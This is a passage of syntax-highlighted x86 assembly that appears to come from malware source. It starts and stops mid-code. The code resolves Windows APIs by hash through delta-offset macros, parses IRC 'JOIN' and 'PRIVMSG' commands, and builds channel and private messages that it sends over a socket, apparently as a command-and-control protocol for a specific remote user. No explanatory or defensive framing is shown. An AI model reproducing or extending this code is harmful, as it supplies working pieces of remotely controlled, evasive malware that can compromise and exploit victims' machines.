</span><span class="sc5">channel</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'#000000'</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc5">finmes4</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetTim</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">InitManage</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">GetTim</span><span class="sc4">,</span><span class="sc5">Im1</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">C_apicall</span><span class="sc0">   </span><span class="sc2">0B50DB39h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">IM1</span><span class="sc0">         </span><span class="sc5">GetSystemTime</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
    
</span><span class="sc6">movzx</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">movzx</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">gettimnot</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0">        </span><span class="sc5">gettimnot</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc12">'0000'</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">loadpointer</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">message4</span><span class="sc4">,</span><span class="sc5">Im2</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">           </span><span class="sc1">; get year</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">loadpointer</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">GetTim</span><span class="sc4">,</span><span class="sc5">Im9</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">movzx</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; get month</span><span class="sc0">

</span><span class="sc6">movzx</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'00'</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">loadpointer</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">message4</span><span class="sc4">,</span><span class="sc5">Im3</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; get month</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc5">finmes4</span><span class="sc4">-</span><span class="sc5">message4</span><span class="sc0">
</span><span class="sc5">loadpointer</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">message4</span><span class="sc4">,</span><span class="sc5">Im5</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">loadpointer</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">sock</span><span class="sc4">,</span><span class="sc5">Im4</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">apicall</span><span class="sc0">     </span><span class="sc2">818A0h</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">               </span><span class="sc1">; send</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Managing</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0Ah</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">Managing1</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;cmp        dword ptr [esi],'ORRE'</span><span class="sc0">
</span><span class="sc1">;jne        checkpriv2aa</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;checkpriv2aa:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;cmp        dword ptr [esi],'solC'</span><span class="sc0">
</span><span class="sc1">;jne        checkpriv2bb</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;checkpriv2bb:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'NIOJ'</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">checkpriv</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">layer3init</span><span class="sc0">

</span><span class="sc5">checkpriv</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'VIRP'</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">analismess2</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc12">' GSM'</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">analismess</span><span class="sc0">

</span><span class="sc5">analismess2</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Managing1</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">analismess</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; hardcoded and added</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; just for cecile communication</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'0000'</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00FFFFFFh</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'ceC:'</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">setzeroit</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; hardcoded and added</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; just for cecile communication</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">storeit</span><span class="sc0">

</span><span class="sc5">setzeroit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">storeit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">cecuser</span><span class="sc4">,</span><span class="sc5">sto1</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">setzeroka</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">layer3</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">channelsend</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">                 </span><span class="sc1">; - 17</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">; - 4</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">; - 4</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">; - 4</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">; - 4</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'VIRP'</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc12">' GSM'</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">channel</span><span class="sc4">,</span><span class="sc5">im6</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">' '</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">; +4</span><span class="sc0">

</span><span class="sc5">doitnow</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0Ah</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">; +4</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">sock</span><span class="sc4">,</span><span class="sc5">im7</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">C_apicall</span><span class="sc0">   </span><span class="sc2">818A0h</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">; +4</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">; +4</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">; +15</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">usersend</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;7*6</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">                 </span><span class="sc1">; - 17</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'VIRP'</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc12">' GSM'</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc12">' ceC'</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'0000'</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0FFFFFFh</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc12">' '</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">doitnow</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Layer 3 protocol, wich make the layer 4 working</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; if something come from the channel, translate it</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">Remote</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'0000'</span><span class="sc0">
</span><span class="sc5">ActualSet</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">layer3init</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">ActualSet</span><span class="sc4">,</span><span class="sc5">ly000</span><span class="sc0">         </span><span class="sc1">; load actual set</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0">             </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">; if we are not in </span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0">              </span><span class="sc5">dontmakeit</span><span class="sc0">                              </span><span class="sc1">; zero mode, dont init</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">             </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">                                </span><span class="sc1">; </span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc12">'A100'</span><span class="sc0">          </span><span class="sc1">; send free mode</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">loadpointer</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">Message1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ly3</span><span class="sc0">       
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">channelsend8</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">

</span><span class="sc5">dontmakeit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">layer3</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; extra_</span><span class="sc0">

</span><span class="sc1">;call   layer4pingdetect</span><span class="sc0">

</span><span class="sc1">; extra_</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">ActualSet</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ly1</span><span class="sc0">             </span><span class="sc1">; </span><span class="sc0">

